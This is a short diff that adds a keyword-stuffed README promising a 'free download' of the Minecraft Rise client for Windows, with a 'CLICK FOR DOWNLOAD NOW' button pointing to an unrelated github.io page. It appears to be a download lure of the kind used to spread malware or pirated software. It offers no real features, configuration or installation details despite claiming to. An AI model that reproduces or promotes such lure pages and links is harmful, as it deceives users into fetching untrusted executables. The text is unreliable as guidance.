@@ -1,10 +1,10 @@
-
+# free download minecraft rise client for Windows | latest installation guide minecraft rise client. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://minecraft-schematica-p-cz42.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
